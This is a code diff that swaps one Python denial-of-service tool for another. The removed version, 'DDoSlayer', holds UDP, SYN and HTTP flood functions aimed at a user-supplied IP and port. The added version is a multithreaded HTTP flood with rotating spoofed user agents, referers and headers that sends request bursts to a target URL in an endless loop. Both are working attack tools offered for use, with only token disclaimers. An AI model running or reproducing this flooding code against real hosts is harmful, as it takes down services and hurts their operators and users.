@@ -1,138 +1,92 @@
-from termcolor import colored
-import sys
-import os
-import time
 import socket
+import requests
 import random
+import threading
+from urllib.parse import urlparse
 
-# Clear the terminal
-os.system("clear")
-os.system("figlet DDoSlayer")
+print("\033[91m"  # Đặt màu đỏ
+"""
+____   ____ .___  __________  ________    ________      _________      _________ ___________  ____ ___  ________    .___  ________   
+\   \ /   / |   | \______   \ \_____  \   \_____  \    /   _____/     /   _____/ \__    ___/ |    |   \ \______ \   |   | \_____  \  
+ \   Y   /  |   |  |    |  _/  /   |   \   /   |   \   \_____  \      \_____  \    |    |    |    |   /  |    |  \  |   |  /   |   \ 
+  \     /   |   |  |    |   \ /    |    \ /    |    \  /        \     /        \   |    |    |    |  /   |    `   \ |   | /    |    \
+   \___/    |___|  |______  / \_______  / \_______  / /_______  /    /_______  /   |____|    |______/   /_______  / |___| \_______  /
+                          \/          \/          \/          \/             \/                                 \/                \/ 
 
-print()
-print(colored("Author   : 'ViBoss Studio' Dhungx | Anna Lee", 'green'))
-print(colored("Github   : https://github.com/Dhungx", 'red'))
-print(colored("Offense is always the best defense!", 'magenta'))
-print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
-print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
-print(colored("You are using DDoSlayer Version: 2.0", 'yellow'))
-print()
+Author: __ViBoss__
 
-# Prompt for target IP and port
-ip = input("Enter the target IP: ")
-try:
-    port = int(input("Enter the target port: "))
-except ValueError:
-    print("Invalid port. Exiting...")
-    sys.exit()
+Github: https://github.com/dhungx
 
-# Prompt for attack duration
-try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
-except ValueError:
-    print("Invalid duration. Exiting...")
-    sys.exit()
+Đừng tấn công web của chính phủ
+\033[0m"  # Reset màu
+)
+useragents = [
+    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
+    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+    "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
+]
+ref = [
+    'http://www.bing.com/search?q=',
+    'https://www.yandex.com/yandsearch?text=',
+    'https://duckduckgo.com/?q='
+]
+acceptall = [
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\n"
+]
 
-# Function to perform the UDP Flood attack
+url = str(input('[+] Target URL: '))
+port = int(input('[+] Port: '))
+pack = int(input('[+] Packet/s: '))
+thread = int(input('[+] Threads: '))
 
+parsed_url = urlparse(url)
+ip = socket.gethostbyname(parsed_url.hostname)
 
-def udp_flood(ip, port, message, dur):
-    # Create the UDP socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    # Set a timeout for the socket so that the program doesn't get stuck
-    s.settimeout(dur)
-
-    # The IP address and port number of the target host
-    target = (ip, port)
-
-    # Start sending packets
-    start_time = time.time()
-    packet_count = 0
-    while True:
-        # Send the message to the target host
-        try:
-            s.sendto(message, target)
-            packet_count += 1
-            print(f"Sent packet {packet_count}")
-        except socket.error:
-            # If the socket is not able to send the packet, break the loop
-            break
-
-        # If the specified duration has passed, break the loop
-        if time.time() - start_time >= dur:
-            break
-
-    # Close the socket
-    s.close()
-
-# Function to perform the SYN Flood attack
-def syn_flood(ip, port, duration):
-    sent = 0
-    timeout = time.time() + int(duration)
-
-    while True:
-        try:
-            if time.time() > timeout:
-                break
-            else:
-                pass
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sent += 1
-            print(f"SYN Packets sent: {sent} to target: {ip}")
-            sock.close()
-        except OSError:
-            pass
-        except KeyboardInterrupt:
-            print("\n[*] Attack stopped.")
-            sys.exit()
-        finally:
-            sock.close()  # Make sure to close the socket in all cases 
-# Function to perform the HTTP Flood attack
-
-def http_flood(ip, port, duration):
-    # create a socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # create HTTP request
-    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
-
-    sent = 0
-    timeout = time.time() + int(dur)
-
+def start():
+    global useragents, ref, acceptall
+    hh = random._urandom(3016)
+    xx = int(0)
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+parsed_url.hostname + "\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(ip, port)
+    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
-            if time.time() > timeout:
-                break
-            else:
-                pass
-            # Re-create the socket for each iteration
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sock.sendall(http_request)
-            sent += 1
-            print(f"HTTP Packets sent: {sent} to target: {ip}")
-        except KeyboardInterrupt:
-            print("\n[-] Attack stopped by user")
-            break
-    sock.close()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, pack)
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(ip, port, xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
 
-
-# Prompt for the type of attack
-attack_type = input(colored(
-    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
-
-if attack_type == "1":
-    message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "red"))
-    udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "red"))
-elif attack_type == "3":
-    print(colored("SYN attack selected", "red"))
-    syn_flood(ip, port, dur)
-elif attack_type == "2":
-    print(colored("HTTP attack selected", "red"))
-    http_flood(ip, port, dur)
-else:
-    print(colored("Invalid attack type. Exiting...", "green"))
-    sys.exit()
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
